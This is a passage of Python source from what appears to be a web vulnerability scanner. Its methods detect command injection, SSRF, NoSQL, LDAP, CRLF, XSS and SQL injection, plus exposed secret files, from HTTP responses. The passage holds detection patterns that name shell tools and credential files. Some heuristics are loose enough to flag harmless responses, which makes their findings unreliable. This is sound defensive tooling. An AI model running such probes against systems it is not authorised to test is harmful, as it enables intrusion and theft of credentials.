            # cat /etc/passwd
            r"root:.*:0:0:", r"daemon:.*:.*:", r"/bin/bash", r"/bin/sh"
        ]
        
        for pattern in unix_cmd_patterns:
            if re.search(pattern, content, re.IGNORECASE | re.MULTILINE):
                return True
        
        # 2. Windows command outputs
        windows_cmd_patterns = [
            # dir command
            r"Directory of [A-Z]:", r"<DIR>", r"\d+\s+File\(s\)",
            # ipconfig
            r"Windows IP Configuration", r"IPv4 Address", r"Subnet Mask",
            # net user
            r"User accounts for", r"Administrator\s+", r"Guest\s+",
            # systeminfo
            r"Host Name:", r"OS Name:", r"System Type:",
            # whoami
            r"[A-Z]+\\[\w-]+", r"NT AUTHORITY", r"BUILTIN",
            # tasklist
            r"Image Name\s+PID\s+", r"Session Name", r"Mem Usage"
        ]
        
        for pattern in windows_cmd_patterns:
            if re.search(pattern, content, re.IGNORECASE | re.MULTILINE):
                return True
        
        # 3. Behavioral analysis - check for command injection indicators in payload
        injection_operators = ['|', ';', '&&', '||', '`', '$(',  '$()', '\n', '\r\n']
        command_names = [
            'id', 'whoami', 'ls', 'dir', 'cat', 'type', 'pwd', 'cd',
            'echo', 'ping', 'curl', 'wget', 'uname', 'hostname', 'ps',
            'netstat', 'ifconfig', 'ipconfig', 'tasklist', 'net', 'systeminfo'
        ]
        
        payload_lower = payload.lower()
        has_operator = any(op in payload for op in injection_operators)
        has_command = any(cmd in payload_lower.split() for cmd in command_names)
        
        if has_operator and has_command:
            # Payload looks like command injection attempt
            # Check if response contains execution evidence
            
            # 4. Check for error messages indicating command execution attempt
            error_patterns = [
                r"command not found", r"not recognized as an internal",
                r"cannot access", r"permission denied", r"access is denied",
                r"no such file or directory", r"syntax error near",
                r"unexpected token", r"sh:", r"bash:", r"cmd.exe"
            ]
            
            for pattern in error_patterns:
                if re.search(pattern, content_lower, re.IGNORECASE):
                    return True
            
            # 5. Check for successful command execution indicators
            # If we sent a ping command, look for ping output
            if 'ping' in payload_lower:
                ping_patterns = [
                    r"\d+ packets transmitted", r"\d+ received",
                    r"Reply from", r"bytes from", r"time=\d+ms",
                    r"Ping statistics", r"TTL=\d+"
                ]
                for pattern in ping_patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        return True
            
            # If we sent echo/print, look for our marker
            if any(cmd in payload_lower for cmd in ['echo', 'print', 'printf']):
                # Extract what we're trying to echo
                echo_match = re.search(r'echo\s+["\']?([^"\';&|]+)["\']?', payload_lower)
                if echo_match:
                    marker = echo_match.group(1).strip()
                    if marker and marker in content:
                        return True
        
        # 6. Check for shell syntax in output
        shell_indicators = ['$', '#', '>', '<', 'bash', 'sh', 'cmd.exe', 'powershell']
        if any(ind in content_lower for ind in shell_indicators):
            # Check if it's in a command context
            for ind in shell_indicators:
                pos = content_lower.find(ind)
                if pos != -1:
                    context = content[max(0, pos-30):min(len(content), pos+30)]
                    # Look for prompt-like patterns
                    if re.search(r'[\w@-]+[:$#>]', context):
                        return True
        
        # 7. Time-based command injection detection
        time_commands = ['sleep', 'timeout', 'waitfor']
        if any(cmd in payload_lower for cmd in time_commands):
            # Extract time value
            time_match = re.search(r'(sleep|timeout|waitfor)\s+(\d+)', payload_lower)
            if time_match:
                # Command accepted (no error) is already suspicious
                if len(content) > 0 and 'error' not in content_lower:
                    return True
        
        return False

    def _quick_detect_ssrf(self, payload: str, content: str, content_lower: str, status: int, final_url: str, original_url: str) -> bool:
        """Fast SSRF detection with cloud focus - DYNAMIC internal network detection."""
        import re
        from urllib.parse import urlparse
        
        # 1. Dynamic cloud metadata detection (AWS, GCP, Azure, DigitalOcean, etc.)
        cloud_patterns = {
            'aws': [
                r'ami[-_]id', r'instance[-_]id', r'instance[-_]type',
                r'security[-_]groups', r'iam[-_]credentials', r'latest/meta-data',
                r'ec2[-_]metadata', r'placement/availability-zone',
                r'"Code"\s*:\s*"Success"', r'"Type"\s*:\s*"AWS-HMAC"'
            ],
            'gcp': [
                r'computemetadata', r'v1/instance', r'v1/project',
                r'service-accounts', r'access-token', r'instance/id',
                r'instance/hostname', r'metadata.google.internal'
            ],
            'azure': [
                r'metadata\.azure\.com', r'api-version=\d{4}-\d{2}-\d{2}',
                r'instance/compute', r'instance/network', r'subscriptionId',
                r'resourceGroupName', r'vmId', r'vmSize'
            ],
            'digitalocean': [
                r'metadata\.digitalocean\.com', r'droplet_id', r'region',
                r'interfaces/public', r'interfaces/private'
            ],
            'alibaba': [
                r'100\.100\.100\.200', r'latest/meta-data',
                r'instance[-_]id', r'image[-_]id', r'instance-type'
            ]
        }
        
        # Check all cloud metadata patterns
        for cloud, patterns in cloud_patterns.items():
            for pattern in patterns:
                if re.search(pattern, content_lower, re.IGNORECASE):
                    return True
        
        # 2. Dynamic internal network detection
        internal_indicators = [
            # Internal network responses
            r'\b10\.\d{1,3}\.\d{1,3}\.\d{1,3}\b',  # 10.0.0.0/8
            r'\b172\.(1[6-9]|2[0-9]|3[01])\.\d{1,3}\.\d{1,3}\b',  # 172.16.0.0/12
            r'\b192\.168\.\d{1,3}\.\d{1,3}\b',  # 192.168.0.0/16
            r'\b127\.\d{1,3}\.\d{1,3}\.\d{1,3}\b',  # Loopback
            r'\blocalhost\b', r'\b::1\b',  # IPv6 loopback
            r'\b169\.254\.\d{1,3}\.\d{1,3}\b',  # Link-local
            # Internal service responses
            r'redis_version', r'redis_mode',
            r'mongodb', r'mongod', r'db version',
            r'elasticsearch', r'cluster_name',
            r'memcached', r'STAT.*version',
            r'<title>.*admin.*</title>', r'<title>.*internal.*</title>',
            # Docker/Container metadata
            r'docker', r'container[-_]id', r'kubernetes',
            r'/var/run/docker.sock', r'containerd'
        ]
        
        for pattern in internal_indicators:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        # 3. Behavioral analysis - URL redirection detection
        if final_url != original_url:
            final_parsed = urlparse(final_url)
            payload_lower = payload.lower()
            
            # Check if we were redirected to an internal address
            internal_hostnames = ['localhost', '127.0.0.1', '::1', '0.0.0.0']
            if any(host in final_parsed.netloc.lower() for host in internal_hostnames):
                return True
            
            # Check for internal IP ranges
            internal_ip_patterns = [
                r'^10\.', r'^172\.(1[6-9]|2[0-9]|3[01])\.', 
                r'^192\.168\.', r'^127\.', r'^169\.254\.'
            ]
            for pattern in internal_ip_patterns:
                if re.match(pattern, final_parsed.netloc):
                    return True
            
            # Check if redirect matches our SSRF payload
            if final_parsed.netloc in payload or final_parsed.path in payload:
                return True
        
        # 4. Port scanning detection (successful connection to internal port)
        port_scan_indicators = [
            # Service banners
            r'SSH-\d+\.\d+', r'220.*FTP', r'220.*SMTP',
            r'HTTP/\d+\.\d+', r'Server:', r'X-Powered-By:',
            # Connection success
            r'connected to', r'connection established',
            # Service-specific responses
            r'\+OK.*ready', r'\* OK.*IMAP', r'220.*ESMTP'
        ]
        
        for pattern in port_scan_indicators:
            if re.search(pattern, content, re.IGNORECASE):
                # Check if payload contains port specification
                if re.search(r':\d{1,5}', payload):
                    return True
        
        # 5. Protocol smuggling detection
        protocol_patterns = {
            'file': [r'file:///', r'<\?xml', r'<!DOCTYPE'],
            'gopher': [r'gopher://', r'STORED', r'DELETED', r'$\d+'],
            'dict': [r'dict://', r'MATCH', r'DEFINE'],
            'ldap': [r'ldap://', r'dn:', r'objectClass:'],
            'tftp': [r'tftp://', r'octet', r'netascii'],
            'ftp': [r'ftp://', r'220 ', r'331 ', r'230 ']
        }
        
        payload_lower = payload.lower()
        for protocol, patterns in protocol_patterns.items():
            if protocol in payload_lower:
                for pattern in patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        return True
        
        # 6. DNS rebinding detection
        # Check for responses that suggest DNS resolution occurred
        if re.search(r'\d+\.\d+\.\d+\.\d+', content):
            # If we see an IP in response and payload contains hostname
            if any(proto in payload_lower for proto in ['http://', 'https://']):
                # Potential DNS rebinding SSRF
                return True
        
        # 7. Time-based SSRF detection (connection attempts)
        if status == 0 or status is None:
            # Connection timeout or failure
            timeout_indicators = ['timeout', 'timed out', 'connection refused', 'unreachable']
            if any(ind in content_lower for ind in timeout_indicators):
                # Check if we're targeting internal networks
                if any(ip in payload for ip in ['127.', '10.', '172.16.', '172.17.', '192.168.', '169.254.']):
                    return True
        
        # 8. Check HTTP response headers for SSRF indicators
        # (headers parameter would need to be passed here, using content for now)
        header_ssrf_indicators = [
            r'via:', r'x-forwarded', r'x-real-ip',
            r'x-cache', r'x-served-by', r'x-backend'
        ]
        
        for indicator in header_ssrf_indicators:
            if re.search(indicator, content_lower, re.IGNORECASE):
                # Internal proxy/cache headers suggest SSRF worked
                return True
        
        # 9. Application-specific SSRF detection
        app_ssrf_patterns = [
            # Jenkins
            r'jenkins', r'hudson', r'build #\d+',
            # Consul
            r'consul', r'"Node":', r'"Service":',
            # Kubernetes
            r'kubernetes', r'"kind":"', r'"apiVersion":',
            # AWS specific
            r'"AccountId":', r'"Arn":', r'"RoleId":',
            # Docker daemon
            r'"Containers":', r'"Images":', r'"ServerVersion":'
        ]
        
        for pattern in app_ssrf_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        return False

    def _quick_detect_sensitive_file(self, filename: str, content: str, content_lower: str) -> bool:
        """Fast sensitive file detection - DYNAMIC content analysis."""
        import re
        
        if len(content) < 20:  # Too small to be significant
            return False
        
        # 1. File-specific dynamic signature detection
        file_signatures = {
            '.env': [
                r'[A-Z_]+_KEY\s*=', r'[A-Z_]+_SECRET\s*=', 
                r'DB_PASSWORD\s*=', r'API_KEY\s*=', r'AWS_',
                r'DATABASE_URL\s*=', r'STRIPE_', r'TWILIO_'
            ],
            '.git/config': [
                r'\[core\]', r'repositoryformatversion\s*=',
                r'\[remote', r'url\s*=.*git', r'fetch\s*='
            ],
            'web.config': [
                r'<configuration>', r'<connectionStrings>',
                r'<appSettings>', r'<system.web>'
            ],
            '.htaccess': [
                r'RewriteEngine', r'RewriteRule', r'RewriteCond',
                r'Options', r'DirectoryIndex', r'ErrorDocument'
            ],
            'composer.json': [
                r'"name"\s*:', r'"require"\s*:', r'"autoload"\s*:',
                r'"psr-\d+"', r'"classmap"'
            ],
            'package.json': [
                r'"name"\s*:', r'"version"\s*:', r'"dependencies"\s*:',
                r'"scripts"\s*:', r'"devDependencies"\s*:'
            ],
            'requirements.txt': [
                r'==\d+\.\d+', r'>=\d+\.\d+', r'django', r'flask', r'requests'
            ],
            'phpinfo.php': [
                r'phpinfo\(\)', r'PHP Version', r'System =>',
                r'Loaded Configuration File', r'php.ini'
            ],
            'backup.sql': [
                r'CREATE TABLE', r'INSERT INTO', r'DROP TABLE',
                r'mysqldump', r'-- MySQL dump', r'Database:'
            ],
            'id_rsa': [
                r'-----BEGIN.*PRIVATE KEY-----', r'-----END.*PRIVATE KEY-----',
                r'^[A-Za-z0-9+/=]{64,}$'
            ],
            'authorized_keys': [
                r'ssh-rsa', r'ssh-dss', r'ssh-ed25519', r'ecdsa-sha2'
            ],
            'shadow': [
                r'root:\$', r'daemon:\$', r'\$\d+\$[a-zA-Z0-9./]+\$'
            ]
        }
        
        # Check file-specific signatures
        for file_pattern, signatures in file_signatures.items():
            if file_pattern in filename.lower():
                for signature in signatures:
                    if re.search(signature, content, re.IGNORECASE | re.MULTILINE):
                        return True
        
        # 2. Generic sensitive content detection
        generic_sensitive_patterns = [
            # Credentials
            r'password\s*[=:]\s*["\']?[^\s"\']{4,}["\']?',
            r'secret\s*[=:]\s*["\']?[^\s"\']{8,}["\']?',
            r'api[_-]?key\s*[=:]\s*["\']?[A-Za-z0-9]{16,}["\']?',
            r'private[_-]?key\s*[=:]\s*["\']?[^\s"\']{8,}["\']?',
            r'token\s*[=:]\s*["\']?[A-Za-z0-9]{16,}["\']?',
            # Database connections
            r'mysql://.*:.*@', r'postgresql://.*:.*@',
            r'mongodb://.*:.*@', r'redis://.*:.*@',
            # AWS credentials
            r'AKIA[0-9A-Z]{16}', r'aws_access_key_id',
            r'aws_secret_access_key',
            # Private keys
            r'BEGIN.*PRIVATE KEY', r'END.*PRIVATE KEY',
            # SSH keys
            r'ssh-rsa\s+[A-Za-z0-9+/]{200,}',
            # JWT tokens  
            r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}',
            # Credit card patterns (PCI DSS violation)
            r'\b(?:4\d{3}|5[1-5]\d{2}|6011)[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b'
        ]
        
        for pattern in generic_sensitive_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        # 3. Configuration file structure detection
        config_structures = [
            r'\[[\w\s]+\]',  # INI sections
            r'<[\w]+>.*</[\w]+>',  # XML tags
            r'^\w+\s*=\s*.+$',  # Key=value pairs
            r'^\s*"[\w-]+"\s*:\s*',  # JSON keys
            r'define\(["\']', # PHP defines
            r'<\?php', # PHP tags
        ]
        
        structure_matches = sum(1 for pattern in config_structures 
                              if re.search(pattern, content, re.MULTILINE))
        if structure_matches >= 2:
            # Looks like a configuration file
            return True
        
        # 4. Check for version control metadata
        vcs_indicators = [
            r'\.git', r'\.svn', r'\.hg',
            r'commit\s+[a-f0-9]{40}', r'revision\s+\d+',
            r'branch\s+[\w/-]+', r'tag\s+v?\d+\.\d+'
        ]
        
        for indicator in vcs_indicators:
            if re.search(indicator, content_lower, re.IGNORECASE):
                return True
        
        # 5. Check for documentation with sensitive information
        doc_sensitive_indicators = [
            r'admin.*password', r'default.*credentials',
            r'test.*account', r'username.*admin',
            r'internal.*use.*only', r'confidential',
            r'do.*not.*share', r'production.*credentials'
        ]
        
        for indicator in doc_sensitive_indicators:
            if re.search(indicator, content_lower, re.IGNORECASE):
                return True
        
        # 6. Check for backup file indicators
        if any(backup in filename.lower() for backup in ['.bak', '.backup', '.old', '.orig', '~']):
            # Backup files often contain sensitive data
            # Check if it has code or config structure
            code_indicators = ['{', '}', '<?', '?>', 'function', 'class', 'import', 'require']
            if any(ind in content_lower for ind in code_indicators):
                return True
        
        # 7. Check for database schema information
        schema_patterns = [
            r'CREATE\s+TABLE', r'ALTER\s+TABLE', r'DROP\s+TABLE',
            r'PRIMARY\s+KEY', r'FOREIGN\s+KEY', r'UNIQUE\s+KEY',
            r'ENGINE\s*=', r'CHARACTER\s+SET', r'COLLATE'
        ]
        
        schema_matches = sum(1 for pattern in schema_patterns 
                           if re.search(pattern, content, re.IGNORECASE))
        if schema_matches >= 2:
            return True
        
        # 8. Dynamic entropy analysis for random secrets
        # High entropy strings often indicate secrets
        def calculate_entropy(s):
            import math
            from collections import Counter
            if not s:
                return 0
            counts = Counter(s)
            probs = [count/len(s) for count in counts.values()]
            return -sum(p * math.log2(p) for p in probs)
        
        # Extract potential secret strings (alphanumeric, 16+ chars)
        potential_secrets = re.findall(r'[A-Za-z0-9]{16,}', content)
        for secret in potential_secrets[:10]:  # Check first 10 matches
            entropy = calculate_entropy(secret)
            if entropy > 4.0:  # High entropy indicates randomness (secrets)
                return True
        
        return False

    def _quick_detect_nosql(self, payload: str, content_lower: str, status: int) -> bool:
        """Fast NoSQL injection detection - DYNAMIC database response analysis."""
        import re
        
        # 1. Dynamic NoSQL database signature detection
        nosql_signatures = {
            'mongodb': [
                r'mongodb', r'mongoerror', r'mongoclient',
                r'bson', r'objectid\(', r'db\.collection',
                r'query.*failed', r'invalid.*query',
                r'unexpected identifier', r'syntaxerror'
            ],
            'couchdb': [
                r'couchdb', r'"ok"\s*:\s*true', r'"error"\s*:',
                r'"reason"\s*:', r'/_design/', r'/_all_docs',
                r'application/json.*couchdb'
            ],
            'redis': [
                r'redis', r'-err', r'-wrongtype', r'-noauth',
                r'redis_version', r'used_memory', r'\$\d+\r\n'
            ],
            'cassandra': [
                r'cassandra', r'invalidrequest', r'syntaxexception',
                r'keyspace', r'column family', r'consistency level'
            ],
            'elasticsearch': [
                r'elasticsearch', r'"error"\s*:\s*{', r'"type"\s*:\s*"',
                r'"reason"\s*:', r'query_shard_exception',
                r'parsing_exception', r'"status"\s*:\s*\d{3}'
            ]
        }
        
        # Check database-specific signatures
        for db_type, signatures in nosql_signatures.items():
            for signature in signatures:
                if re.search(signature, content_lower, re.IGNORECASE):
                    return True
        
        # 2. NoSQL operator injection detection
        nosql_operators = ['$ne', '$gt', '$lt', '$gte', '$lte', '$regex', '$where', 
                          '$exists', '$in', '$nin', '$or', '$and', '$not']
        
        if any(op in payload for op in nosql_operators):
            # Check for successful injection indicators
            injection_success_patterns = [
                r'\[.*\]',  # Array response
                r'\{.*".*".*:.*\}',  # JSON object
                r'"_id"\s*:',  # MongoDB document
                r'"ok"\s*:\s*\d',  # Success response
                r'"total"\s*:',  # Search results
                r'"count"\s*:',  # Count response
            ]
            
            for pattern in injection_success_patterns:
                if re.search(pattern, content_lower, re.IGNORECASE):
                    return True
            
            # Check for error responses indicating parsing attempt
            if status in [400, 500] and any(err in content_lower for err in 
                                           ['parse', 'syntax', 'invalid', 'unexpected']):
                return True
        
        # 3. JavaScript injection detection (for $where)
        if '$where' in payload or 'function' in payload.lower():
            js_error_patterns = [
                r'syntaxerror', r'referenceerror', r'typeerror',
                r'unexpected token', r'unexpected identifier',
                r'invalid.*javascript', r'function.*error'
            ]
            
            for pattern in js_error_patterns:
                if re.search(pattern, content_lower, re.IGNORECASE):
                    return True
        
        # 4. Behavioral analysis - authentication bypass patterns
        auth_bypass_operators = ['[$ne]', '[$gt]', '[$regex]=.*']
        if any(op in payload for op in auth_bypass_operators):
            # Check if we got a success response (potential auth bypass)
            if status == 200 and len(content_lower) > 100:
                # Look for dashboard/admin indicators
                success_indicators = [
                    'welcome', 'dashboard', 'logout', 'admin',
                    'profile', 'settings', 'logged in', 'authentication successful'
                ]
                if any(ind in content_lower for ind in success_indicators):
                    return True
        
        # 5. Check for data extraction success
        if status == 200:
            # Look for structured data that might indicate successful extraction
            data_indicators = [
                r'\[.*\{.*\}.*\]',  # Array of objects
                r'\{.*"data".*:.*\[',  # Data array
                r'"results".*:.*\[',  # Results array
                r'"documents".*:.*\[',  # Documents array
                r'"_id".*:.*"[a-f0-9]{24}"',  # MongoDB ObjectId
            ]
            
            for pattern in data_indicators:
                if re.search(pattern, content_lower, re.IGNORECASE):
                    return True
        
        # 6. Check for NoSQL-specific error messages
        specific_errors = [
            r'failed to parse',  r'cannot use.*operator',
            r'unknown.*operator', r'invalid.*operator',
            r'query.*exceeded', r'operation.*not.*permitted'
        ]
        
        for pattern in specific_errors:
            if re.search(pattern, content_lower, re.IGNORECASE):
                return True
        
        return False
    
    def _quick_detect_ldap(self, content_lower: str) -> bool:
        """Fast LDAP injection detection - DYNAMIC LDAP response analysis."""
        import re
        
        # 1. LDAP error signature detection
        ldap_errors = [
            r'ldap.*error', r'ldap.*exception', r'invalid.*dn',
            r'invalid.*syntax', r'ldap.*search.*failed',
            r'operations.*error', r'protocol.*error',
            r'size.*limit.*exceeded', r'time.*limit.*exceeded',
            r'strong.*auth.*required', r'invalid.*credentials'
        ]
        
        for pattern in ldap_errors:
            if re.search(pattern, content_lower, re.IGNORECASE):
                return True
        
        # 2. LDAP attribute detection
        ldap_attributes = [
            r'\bcn\s*=', r'\bou\s*=', r'\bdc\s*=', r'\buid\s*=',
            r'\bobjectclass\s*[:=]', r'\bmail\s*[:=]',
            r'\bgivenname\s*[:=]', r'\bsn\s*[:=]',
            r'\bdistinguishedname\s*[:=]', r'\bmember\s*[:=]'
        ]
        
        attr_count = sum(1 for pattern in ldap_attributes 
                        if re.search(pattern, content_lower, re.IGNORECASE))
        if attr_count >= 2:
            return True
        
        # 3. LDIF format detection
        ldif_indicators = [
            r'^dn:\s*', r'^changetype:\s*', r'^objectclass:\s*',
            r'version:\s*\d+', r'^add:\s*', r'^delete:\s*'
        ]
        
        for pattern in ldif_indicators:
            if re.search(pattern, content_lower, re.MULTILINE | re.IGNORECASE):
                return True
        
        # 4. Directory service response patterns
        directory_patterns = [
            r'directory.*service', r'active.*directory',
            r'ldap://.*:\d+', r'ldaps://.*:\d+',
            r'base.*dn', r'search.*scope', r'filter'
        ]
        
        for pattern in directory_patterns:
            if re.search(pattern, content_lower, re.IGNORECASE):
                return True
        
        return False
    
    def _quick_detect_xpath(self, content_lower: str) -> bool:
        """Fast XPath injection detection - DYNAMIC XPath error analysis."""
        import re
        
        # 1. XPath-specific error patterns
        xpath_errors = [
            r'xpath.*error', r'xpath.*exception', r'xpath.*syntax',
            r'invalid.*xpath', r'xmlxpatheval', r'xslt.*error',
            r'expression.*error', r'libxml', r'msxml'
        ]
        
        for pattern in xpath_errors:
            if re.search(pattern, content_lower, re.IGNORECASE):
                return True
        
        # 2. XPath function names in errors
        xpath_functions = [
            r'concat\(', r'substring\(', r'string-length\(',
            r'contains\(', r'starts-with\(', r'normalize-space\(',
            r'translate\(', r'name\(', r'local-name\(',
            r'namespace-uri\(', r'count\(', r'position\('
        ]
        
        for func in xpath_functions:
            if re.search(func, content_lower, re.IGNORECASE):
                # Check if in error context
                pos = content_lower.find(func.replace('\\', ''))
                if pos != -1:
                    context = content_lower[max(0, pos-50):min(len(content_lower), pos+50)]
                    if any(err in context for err in ['error', 'exception', 'failed', 'invalid']):
                        return True
        
        # 3. XML parsing errors related to XPath
        xml_xpath_patterns = [
            r'xml.*parse.*error', r'malformed.*xml',
            r'unexpected.*token', r'expected.*but.*found',
            r'invalid.*xml', r'xml.*document.*error'
        ]
        
        for pattern in xml_xpath_patterns:
            if re.search(pattern, content_lower, re.IGNORECASE):
                return True
        
        # 4. XPath axis and node test indicators
        xpath_syntax = [
            r'child::', r'parent::', r'ancestor::', r'descendant::',
            r'following::', r'preceding::', r'attribute::',
            r'node\(\)', r'text\(\)', r'comment\(\)'
        ]
        
        syntax_count = sum(1 for pattern in xpath_syntax 
                          if re.search(pattern, content_lower, re.IGNORECASE))
        if syntax_count >= 2:
            return True
        
        return False

    def _quick_detect_open_redirect(self, payload: str, headers: Dict, status: int) -> bool:
        """Fast open redirect detection - DYNAMIC redirect analysis."""
        import re
        from urllib.parse import urlparse, unquote
        
        # 1. Check for redirect status codes
        if status not in [301, 302, 303, 307, 308]:
            return False
        
        location = headers.get('location', '').lower()
        if not location:
            return False
        
        # 2. Decode location header for analysis
        location_decoded = unquote(location)
        payload_lower = payload.lower()
        payload_decoded = unquote(payload_lower)
        
        # 3. Direct payload match in location
        if payload_lower in location or payload_decoded in location_decoded:
            return True
        
        # 4. Parse redirect destination
        try:
            redirect_parsed = urlparse(location_decoded)
            
            # Check if redirecting to external domain
            external_indicators = [
                'http://', 'https://', '//',  # Protocol indicators
                'evil.com', 'attacker', 'malicious',  # Test domains
            ]
            
            for indicator in external_indicators:
                if indicator in location_decoded:
                    # Check if our payload contains similar domain
                    if indicator in payload_decoded:
                        return True
            
            # 5. Check for open redirect patterns in location
            redirect_patterns = [
                r'url\s*=.*https?://',
                r'redirect\s*=.*https?://',
                r'return\s*=.*https?://',
                r'next\s*=.*https?://',
                r'goto\s*=.*https?://',
                r'target\s*=.*https?://'
            ]
            
            for pattern in redirect_patterns:
                if re.search(pattern, location_decoded, re.IGNORECASE):
                    return True
            
            # 6. Check for protocol-relative URLs
            if location_decoded.startswith('//'):
                # Protocol-relative redirect
                netloc = redirect_parsed.netloc
                if netloc and netloc in payload_decoded:
                    return True
            
            # 7. Check for JavaScript-based redirects
            js_redirect_patterns = [
                r'javascript:.*location', r'javascript:.*href',
                r'javascript:.*redirect', r'javascript:.*window'
            ]
            
            for pattern in js_redirect_patterns:
                if re.search(pattern, location_decoded, re.IGNORECASE):
                    return True
            
            # 8. Check for data URI redirects
            if location_decoded.startswith('data:'):
                return True
            
            # 9. Check for URL confusion attacks
            confusion_patterns = [
                r'@',  # Username separator can confuse browsers
                r'%00',  # Null byte
                r'%0a', r'%0d',  # Newlines
                r'\.\.', r'\.\.%2f',  # Directory traversal
            ]
            
            for pattern in confusion_patterns:
                if pattern in location_decoded:
                    return True
            
        except Exception:
            pass
        
        # 10. Check for partial match with payload domain/path
        # Extract domain from payload if present
        if any(proto in payload_decoded for proto in ['http://', 'https://', '//']):
            try:
                payload_parsed = urlparse(payload_decoded)
                if payload_parsed.netloc and payload_parsed.netloc in location_decoded:
                    return True
            except Exception:
                pass
        
        return False
    
    def _quick_detect_crlf(self, payload: str, headers: Dict) -> bool:
        """Fast CRLF injection detection - DYNAMIC header injection analysis."""
        import re
        
        # 1. Check for CRLF sequences in payload
        crlf_indicators = ['\r\n', '%0d%0a', '%0a', '%0d', '\n', '\r']
        has_crlf = any(ind in payload.lower() for ind in crlf_indicators)
        
        if not has_crlf:
            return False
        
        # 2. Dynamic header injection detection
        # Check if any suspicious headers were injected
        injection_indicators = {
            'set-cookie': ['injected', 'malicious', 'test', 'pwned'],
            'location': ['http://', 'https://', 'javascript:'],
            'content-type': ['text/html', 'text/javascript'],
            'content-length': ['0'],
            'x-custom': ['.*'],  # Any custom header is suspicious
            'x-injected': ['.*'],
            'x-test': ['.*']
        }
        
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        
        for header_name, suspicious_values in injection_indicators.items():
            if header_name in headers_lower:
                header_value = headers_lower[header_name]
                for suspicious in suspicious_values:
                    if suspicious == '.*' or suspicious in header_value:
                        return True
        
        # 3. Check for duplicate headers (sign of CRLF injection)
        header_names = [k.lower() for k in headers.keys()]
        if len(header_names) != len(set(header_names)):
            # Duplicate headers detected
            return True
        
        # 4. Check for response splitting
        # If we see HTTP response codes in headers, that's response splitting
        response_patterns = [
            r'http/\d\.\d\s+\d{3}',
            r'200 ok', r'302 found', r'404 not found'
        ]
        
        headers_str = ' '.join(f"{k}: {v}" for k, v in headers.items()).lower()
        for pattern in response_patterns:
            if re.search(pattern, headers_str, re.IGNORECASE):
                return True
        
        # 5. Check for header value injection from payload
        # Extract what we tried to inject
        if '%0d%0a' in payload.lower():
            injected_parts = payload.lower().split('%0d%0a')
            for part in injected_parts[1:]:  # Skip first part (before injection)
                # Check if this appears in any header
                if part:
                    # Clean up the part
                    part_clean = part.strip().replace('%20', ' ')
                    if ':' in part_clean:
                        # Extract header name
                        header_attempt = part_clean.split(':')[0].strip()
                        if header_attempt in headers_lower:
                            return True
        
        # 6. Check for XSS via CRLF in headers
        xss_patterns = [
            r'<script', r'javascript:', r'onerror=',
            r'onload=', r'<iframe', r'<object'
        ]
        
        for pattern in xss_patterns:
            if re.search(pattern, headers_str, re.IGNORECASE):
                return True
        
        # 7. Check for cache poisoning indicators
        cache_headers = ['cache-control', 'expires', 'etag', 'last-modified']
        suspicious_cache = False
        for cache_header in cache_headers:
            if cache_header in headers_lower:
                # Check if value looks injected
                value = headers_lower[cache_header]
                if any(sus in value for sus in ['injected', 'test', 'pwned', '<', '>']):
                    suspicious_cache = True
        
        if suspicious_cache:
            return True
        
        # 8. Check for session fixation via CRLF
        if 'set-cookie' in headers_lower:
            cookie_value = headers_lower['set-cookie']
            # Check for suspicious session IDs
            session_patterns = [
                r'sessionid=injected', r'phpsessid=test',
                r'jsessionid=.*injected', r'session=pwned'
            ]
            for pattern in session_patterns:
                if re.search(pattern, cookie_value, re.IGNORECASE):
                    return True
        
        return False

    async def _check_post_vulnerability(self, url: str, check_type: str, payload: str) -> List[Dict]:
        """Handle POST-based vulnerability checks for XXE and Template Injection."""
        findings = []
        try:
            if check_type == 'xxe':
                headers = {'Content-Type': 'application/xml'}
                status, resp_headers, content, final_url = await self.session.post(url, data=payload, headers=headers)
                if self._detect_xxe(payload, content, resp_headers):
                    findings.append(self._create_finding('XXE', 'CRITICAL', f"XML External Entity injection detected", url))
            
            elif check_type == 'template_injection':
                data = {'template': payload, 'content': payload, 'data': payload}
                status, resp_headers, content, final_url = await self.session.post(url, data=data)
                if self._detect_template_injection(payload, content, resp_headers):
                    findings.append(self._create_finding('Template Injection', 'CRITICAL', f"Template injection with payload: {payload}", url))
        
        except Exception as e:
            self.config.logger.debug(f"Error in POST vulnerability check {check_type}: {e}")
        return findings

    def _detect_xss(self, payload: str, content: str, headers: Dict) -> bool:
        """Advanced XSS detection with multiple variants."""
        content_lower = content.lower()
        payload_lower = payload.lower()
        
        # Direct reflection
        if payload in content:
            return True
        
        # HTML entity encoded reflection
        import html
        if html.escape(payload) in content:
            return True
        
        # Check for script execution indicators
        xss_indicators = [
            'alert(', 'confirm(', 'prompt(', 'console.log(',
            'javascript:', 'onerror=', 'onload=', 'onclick=',
            '<script', '</script>', 'eval(', 'document.cookie'
        ]
        
        for indicator in xss_indicators:
            if indicator.lower() in content_lower:
                return True
        
        # Check X-XSS-Protection header bypass
        xss_protection = headers.get('x-xss-protection', '').lower()
        if xss_protection in ['0', 'disabled']:
            return True
        
        return False

    def _detect_sqli(self, payload: str, content: str, headers: Dict, status: int) -> bool:
        """Enhanced SQL injection detection with database-specific patterns."""
        content_lower = content.lower()
        
        # Database error patterns (expanded)
        sql_errors = [
            # MySQL
            'you have an error in your sql syntax', 'mysql_fetch_array',
            'mysql_num_rows', 'mysqldump', 'mysql_connect',
            # PostgreSQL
            'postgresql query failed', 'pg_query()', 'pg_exec()',
            'unterminated quoted string', 'invalid input syntax',
            # Oracle
            'ora-00921', 'ora-00933', 'ora-00936', 'ora-01756',
            'sqlplus', 'oracle database',
            # SQL Server
            'microsoft ole db provider', 'sqlserver', 'mssql',
            'incorrect syntax near', 'unclosed quotation mark',
            # SQLite
            'sqlite_master', 'sqlite error', 'sqlite3.operationalerror',
            # Generic
            'sql syntax', 'syntax error', 'database error',
            'query failed', 'invalid query', 'mysql error'
        ]
        
        for error in sql_errors:
            if error in content_lower:
                return True
        
        # Union-based injection detection
        if 'union' in payload.lower() and any(marker in content_lower for marker in 
                                             ['union', 'select', 'information_schema']):
            return True
        
        # Boolean-based blind injection (response size changes)
        if status in [500, 503] and 'error' in content_lower:
            return True
        
        return False

